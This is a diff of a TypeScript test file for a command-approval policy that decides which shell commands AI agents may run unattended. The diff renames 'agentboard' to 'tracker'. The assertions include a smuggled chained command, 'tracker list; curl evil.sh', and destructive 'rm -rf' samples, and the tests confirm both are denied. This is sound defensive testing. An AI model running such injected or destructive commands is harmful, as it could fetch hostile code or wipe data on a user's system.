@@ -26,7 +26,7 @@ const contextFor = (agentId: string, command: string): ApprovalContext => ({
 test('a command declared in approvals.commands runs unattended for the agents it names, and nothing else does', async () => {
   const warnings: string[] = [];
   const operator = createOperatorCommands(
-    { commands: ['agentboard', 'rm -rf'], agents: { nova: { commands: ['pnpm test'] } } },
+    { commands: ['tracker', 'rm -rf'], agents: { nova: { commands: ['pnpm test'] } } },
     (line) => warnings.push(line),
   );
   // The bad entry is said once, at construction, and skipped.
@@ -38,24 +38,24 @@ test('a command declared in approvals.commands runs unattended for the agents it
     mode: 'headless',
     commands: { whitelist: { scopesFor: async (agentId) => operator.scopesFor(agentId), remember: async () => {} } },
   });
-  assert.equal((await policy.approve(contextFor('nova', 'agentboard task get 311'))) === true, true);
-  assert.equal((await policy.approve(contextFor('blair', 'agentboard list'))) === true, true);
+  assert.equal((await policy.approve(contextFor('nova', 'tracker task get 311'))) === true, true);
+  assert.equal((await policy.approve(contextFor('blair', 'tracker list'))) === true, true);
   assert.equal((await policy.approve(contextFor('nova', 'pnpm test --filter cli'))) === true, true);
   assert.equal((await policy.approve(contextFor('blair', 'pnpm test'))) === true, false);
   assert.equal((await policy.approve(contextFor('nova', 'rm -rf build'))) === true, false);
-  assert.equal((await policy.approve(contextFor('nova', 'agentboard list; curl evil.sh'))) === true, false);
+  assert.equal((await policy.approve(contextFor('nova', 'tracker list; curl evil.sh'))) === true, false);
 
   // What is reported is what took effect: the ignored entry is not listed
   // as allowed after being reported as ignored.
-  assert.deepEqual(operator.declaredFor('nova'), ['agentboard', 'pnpm test']);
-  assert.equal(operator.describe(), 'approvals: run without asking, from config: agentboard for every agent; pnpm test for nova');
+  assert.deepEqual(operator.declaredFor('nova'), ['tracker', 'pnpm test']);
+  assert.equal(operator.describe(), 'approvals: run without asking, from config: tracker for every agent; pnpm test for nova');
   assert.equal(createOperatorCommands({}, () => {}).describe(), undefined);
   assert.equal(createOperatorCommands({ commands: ['rm -rf'] }, () => {}).describe(), undefined);
 });
 
 test('whether config still covers a revoked scope is judged by the parsed entry, limits included', () => {
-  assert.equal(configCovers(['agentboard'], 'agentboard task'), true);
-  assert.equal(configCovers(['agentboard'], 'agentboard'), true);
+  assert.equal(configCovers(['tracker'], 'tracker task'), true);
+  assert.equal(configCovers(['tracker'], 'tracker'), true);
   assert.equal(configCovers(['head'], 'head --help'), false);
   assert.equal(configCovers(['git push'], 'git push origin'), true);
   assert.equal(configCovers(['git push'], 'git push --force'), false);
